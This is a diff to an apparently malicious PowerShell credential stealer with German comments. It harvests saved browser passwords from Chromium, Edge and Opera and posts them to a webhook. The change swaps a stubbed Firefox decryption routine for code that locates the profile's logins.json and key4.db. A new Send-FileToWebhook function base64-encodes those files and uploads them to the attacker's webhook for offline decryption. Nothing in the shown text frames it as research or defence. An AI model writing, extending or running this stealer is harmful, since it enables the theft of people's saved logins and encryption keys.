@@ -52,29 +52,36 @@ function Get-ChromiumPasswords {
     return $passwords
 }
 
-# Funktion zum Auslesen von Firefox-Passwörtern
-function Get-FirefoxPasswords {
+# Funktion zum Sammeln der Firefox-Dateien
+function Get-FirefoxFiles {
     $appData = [System.Environment]::GetFolderPath('ApplicationData')
     $firefoxProfile = Get-ChildItem "$appData\Mozilla\Firefox\Profiles" | Where-Object { $_.PSIsContainer } | Select-Object -First 1
     $loginsJson = "$appData\Mozilla\Firefox\Profiles\$firefoxProfile\logins.json"
     $key4Db = "$appData\Mozilla\Firefox\Profiles\$firefoxProfile\key4.db"
 
-    if (Test-Path $loginsJson) {
-        $logins = Get-Content $loginsJson | ConvertFrom-Json
-        $passwords = @()
-        foreach ($login in $logins.logins) {
-            $url = $login.hostname
-            $username = $login.encryptedUsername
-            $password = $login.encryptedPassword
-
-            # Entschlüsseln der Passwörter
-            $password = "Decryption logic here" # Hier muss der Entschlüsselungsprozess für Firefox implementiert werden
-
-            $passwords += [PSCustomObject]@{ URL = $url; Username = $username; Password = $password }
-        }
-        return @($passwords, $key4Db)
+    if (Test-Path $loginsJson -and Test-Path $key4Db) {
+        return @($loginsJson, $key4Db)
     }
     return @()
+}
+
+# Funktion zum Senden einer Datei an den Webhook
+function Send-FileToWebhook {
+    param (
+        [string]$filePath,
+        [string]$webhookUrl
+    )
+
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $fileBase64 = [Convert]::ToBase64String($fileBytes)
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+
+    $body = @{
+        FileName = $fileName
+        FileContent = $fileBase64
+    }
+
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
 }
 
 # Funktion zum Auslesen von Edge-Passwörtern
@@ -103,9 +110,8 @@ Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser
 $operaPasswords = Get-ChromiumPasswords -browserPath "Opera Software\Opera Stable"
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Opera"; "Passwords" = $operaPasswords}) -ContentType "application/json"
 
-# Firefox-Passwörter und key4.db sammeln und senden
-$firefoxData = Get-FirefoxPasswords
-$firefoxPasswords = $firefoxData[0]
-$key4DbPath = $firefoxData[1]
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Firefox"; "Passwords" = $firefoxPasswords}) -ContentType "application/json"
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Firefox"; "Key4DbPath" = $key4DbPath}) -ContentType "application/json"
+# Firefox-Dateien sammeln und senden
+$firefoxFiles = Get-FirefoxFiles
+foreach ($file in $firefoxFiles) {
+    Send-FileToWebhook -filePath $file -webhookUrl $webhookUrl
+}
